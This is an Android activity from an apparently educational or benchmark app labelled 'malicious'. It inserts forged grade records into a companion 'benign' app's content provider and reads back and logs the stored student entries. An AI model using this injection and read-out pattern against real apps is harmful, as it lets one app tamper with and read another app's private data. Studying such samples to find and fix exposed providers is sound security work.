package edu.ksu.cs.malicious;

import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.util.HashSet;
import java.util.Set;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "Malicious";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }


    @Override
    protected void onResume() {
        super.onResume();
        final EditText name = (EditText) findViewById(R.id.name);
        final EditText grade = (EditText) findViewById(R.id.grade);
        final Button inject = (Button) findViewById(R.id.inject_btn);
        final Button verify = (Button) findViewById(R.id.verify_btn);
        final EditText result = (EditText) findViewById(R.id.result);

        inject.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Uri.Builder uriBuilder = new Uri.Builder();
                uriBuilder.authority("edu.ksu.cs.benign.grades");
                uriBuilder.scheme("content");
                ContentValues contentValues = new ContentValues();
                contentValues.put(name.getText().toString(), grade.getText().toString());
                if (getContentResolver().insert(uriBuilder.build(), contentValues) != null) {
                    Toast.makeText(getApplicationContext(), "grades saved successfully", Toast.LENGTH_SHORT).show();
                } else
                    Toast.makeText(getApplicationContext(), "failed to save grades! Try again", Toast.LENGTH_SHORT).show();
            }
        });

        verify.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Set<String> set = null;
                Uri.Builder uriBuilder = new Uri.Builder();
                uriBuilder.authority("edu.ksu.cs.benign.grades");
                uriBuilder.scheme("content");
                Cursor mCursor = getContentResolver().query(uriBuilder.build(), null, null, null, null, null);
                if (mCursor != null && mCursor.getCount() > 0) {
                    set = new HashSet<String>();
                    while (mCursor.moveToNext()) {
                        String entry = mCursor.getString(mCursor.getColumnIndex("stuInfo"));
                        Log.d(TAG, entry);
                        if (!set.add(entry)) {
                            result.setText("Congratulations! Your guessed the right grade");
                        }
                    }
                }
                mCursor.close();
            }
        });
    }
}
